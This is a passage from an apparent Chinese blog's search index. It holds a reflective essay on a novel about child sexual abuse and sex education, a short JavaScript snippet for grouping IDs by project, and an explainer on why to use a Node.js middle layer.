        <tags>
            
            <tag> egg </tag>
            
            <tag> vue </tag>
            
            <tag> sequelize </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>世界的阴暗面，和我们假装美好的教育</title>
      <link href="/2021/08/25/book-record/"/>
      <url>/2021/08/25/book-record/</url>
      
        <content type="html"><![CDATA[<h1 id="世界的阴暗面，和我们假装美好的教育"><a href="#世界的阴暗面，和我们假装美好的教育" class="headerlink" title="世界的阴暗面，和我们假装美好的教育"></a>世界的阴暗面，和我们假装美好的教育</h1><p>—-读《房思琪的初恋乐园》有感</p><p>作者：柒祭·落</p><p><code>读完整本小说，整个人都沉浸在那种悲伤中，想到之前看过的《素媛》和《熔炉》，小说中最让我心痛的一个词叫“世界的背面”。如果思琪活在世界的正面，健康快乐的长大，像大多数同龄孩子一样，为考试成绩而忧愁，为同桌的男孩而害羞，就是我们大多数人的人生。可我们都忘了，这个世界还有背面，那些我们无法言说无法体会的痛楚和丑陋，依然在如今这个看似美好的世界，活生生的存在着。</code></p><p>读了小说，看了林奕含的采访视频，发现那个看着温柔美好的女孩子，对文学有着很深的爱，读过的书，书里的人，写书的人，都成为了她的信仰，成为了她深深的爱，而这也成了她对老师又爱又恨的原因。她爱老师和她信仰相同，在她对文学有懵懵懂懂的理解时，老师是那个让她无比崇拜的人，可是在她还没有真正理解文学里的爱时，她崇拜的人却深深的伤害了她。也许最后，林奕含的自杀，不是因为那段痛苦的回忆，而是她无法接受她爱的信仰也有可能只是一种假象。</p><p>那些书写了美好世界，完美爱情的人，在现实世界，却可能是个虐打妻子的暴力男。林奕含无法接受这样的虚假。</p><blockquote><p>最后，让我深思而心痛的是，我们缺失的性教育。</p></blockquote><p>在思琪问妈妈，我们家什么都有，就是没有性教育的时候，妈妈的回答是只有需要性的人才需要性教育，所谓教育不就是这样吗？</p><p>所谓教育不就是这样吗？</p><p>我们需要什么，或者说我们认为孩子需要什么，我们就教给他们什么。可是孩子会在生活中遇到我们以为不会发生的事，而这种时候，孩子会很迷茫，TA不知道什么是对什么是错，也不知道该如何面对。而试探性的问问父母，父母的反应也依旧停留于已有的认知，而没有思考孩子为什么会这么问。思琪的父母如此，怡婷的父母同样，所以怡婷才会在思琪痛苦的时候，没有帮助和陪伴她，反而给了她更多的伤害。因为怡婷也不知道思琪是受到了伤害，她认为这件事超出了教育认知里的常规，所以就是错的。</p><p>纵然有人想努力用各种方式，将这个世界的阴暗面撕开，纵然有很多人在看过后愤怒，心痛，可我们却不得不承认，在愤怒和心痛过之后，我们依然无法阻止这样的事继续发生。我们读书，在书里看到美好的世界，也看到阴暗的世界。这一切，都是真实的，真实的美好，也真实的阴暗，并且，我们无力改变。</p><h3 id="这就是让人最心痛的。"><a href="#这就是让人最心痛的。" class="headerlink" title="这就是让人最心痛的。"></a>这就是让人最心痛的。</h3><p>1991年出生，2017年离世，心痛那个美好姑娘的美好年华，就这样结束。被这个世界的阴暗面，和我们假装美好的教育，合伙谋杀。也许原本，她不用这样过一生。</p>]]></content>
      
      
      <categories>
          
          <category> Reading-Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> perception </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript引用类型的用法</title>
      <link href="/2021/08/21/object-type/"/>
      <url>/2021/08/21/object-type/</url>
      
        <content type="html"><![CDATA[<h4 id="操作数据"><a href="#操作数据" class="headerlink" title="操作数据"></a>操作数据</h4><pre><code>  const originData = [&quot;1#12&quot;, &quot;2#12&quot;, &quot;3#13&quot;, &quot;5#13&quot;, &quot;4#13&quot;, &quot;1#14&quot;];  </code></pre><p><code>#</code>后面为projectId ，前面为modelId</p><h4 id="目标数据"><a href="#目标数据" class="headerlink" title="目标数据"></a>目标数据</h4><pre><code>const targetData = [  &#123; projectId: &quot;12&quot;, modelId: [&quot;1&quot;, &quot;2&quot;] &#125;,  &#123; projectId: &quot;13&quot;, modelId: [&quot;3&quot;, &quot;5&quot;, &quot;4&quot;] &#125;,  &#123; projectId: &quot;14&quot;, modelId: [&quot;1&quot;] &#125;,];</code></pre><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><pre><code> function getList(list) &#123;  const temp = &#123;&#125;; // 定义的临时数据  const arr = [];  list.forEach((val) =&gt; &#123;    // 分割需要用到的数据    const [mid, pid] = val.split(&quot;#&quot;);    // 如果临时数据中存在当前项的projectId，则在temp[pid]值中追加modelId    if (temp[pid]) &#123;      temp[pid].push(mid);    &#125; else &#123;    // 如果不存在临时数据中存储当前projectId对应modelId的值      temp[pid] = [mid];      arr.push(&#123;        projectId: pid,        modelId: temp[pid], // 这里取temp中projectId所对应的值「其实就是引用类型的用法」      &#125;);    &#125;  &#125;);  return arr;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么要有node.js中间层？</title>
      <link href="/2020/08/20/hello-world/"/>
      <url>/2020/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么要有node-js中间层？"><a href="#为什么要有node-js中间层？" class="headerlink" title="为什么要有node.js中间层？"></a>为什么要有node.js中间层？</h3><p>目前流行前后端分离开发方式。虽然这里分离干净了，分工也很明确了，看似一切都那么美好，but…我们也很容易发现问题的所在：<br>1:Client-side Model 是 Server-side Model 的加工<br>2:Client-side View 跟 Server-side是 不同层次的东西<br>3:Client-side的Controller 跟 Sever-side的Controller 各搞各的<br>4:Client-side的Route 但是 Server-side 可能没有</p><p>服务端和客户端各层职责重叠，大家各搞各的，很难统一具体要做的事情。并且可能会伴随着一些性能上的问题。最具体的表现就是我们常用的 SPA 应用：</p><p>1:渲染，取值都在客户端进行，有性能的问题<br>2:需要等待资源到齐才能进行，会有短暂白屏与闪动<br>3:在移动设备低速网路的体验奇差无比<br>4:渲染都在客户端，模版无法重用，SEO 实现 麻烦</p><p>这个就是中间层nodejs的意义，下面我们来看一下常见的业务场景：</p><h4 id="1-接口数据可靠性修复"><a href="#1-接口数据可靠性修复" class="headerlink" title="1. 接口数据可靠性修复"></a>1. 接口数据可靠性修复</h4><p>有的时候服务端返回给我们的数据可能并不是前端想要的结构，所有用到的展现数据都是后端通过异步接口(AJAX/JSONP)的方式提供的，前端只管展现。但是后端经常提供后端的数据逻辑，在前端还需要去处理这些数据逻辑。</p><h4 id="2-页面性能优化-和-SEO"><a href="#2-页面性能优化-和-SEO" class="headerlink" title="2. 页面性能优化 和 SEO"></a>2. 页面性能优化 和 SEO</h4><p>有的时候我们做单页面应用，经常会碰到首屏加载性能问题，这个时候如果我们接了中间层nodejs的话，那么我们可以把首屏渲染的任务交给nodejs去做，次屏的渲染依然走之前的浏览器渲染。（前端换页，浏览器端渲染，直接输入网址，服务器渲染）服务端渲染对页面进行拼接直出html字符串，可以大幅提高首屏渲染的时间，减少用户的等待时间。这种形式应用最广的比如 Vue 的服务端渲染，里面也有相关的介绍。其次对于单页面的SEO优化也是很好地处理方式，由于目前的ajax并不被搜索百度等搜索引擎支持，所以如果想要得到爬虫的支持，那么服务端渲染也是一种解决方法。</p><h4 id="3-淘宝常见的需求解决方案"><a href="#3-淘宝常见的需求解决方案" class="headerlink" title="3. 淘宝常见的需求解决方案"></a>3. 淘宝常见的需求解决方案</h4><p>需求：在淘宝，单日四亿PV，页面数据来自各个不同接口，为了不影响体验，先产生页面框架后，在发起多个异步请求取数据更新页面，这些多出来的请求带来的影响不小，尤其在无线端。解决方案：在 NodeJS 端使用 Bigpiper 技术，合并请求，降低负担，分批输出，不影响体验。同时可以拆分大接口为独立小接口，并发请求。串行 =&gt; 并行，大幅缩短请求时间。</p>]]></content>
      
      
      <categories>
          
          <category> BackEnd-Tec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
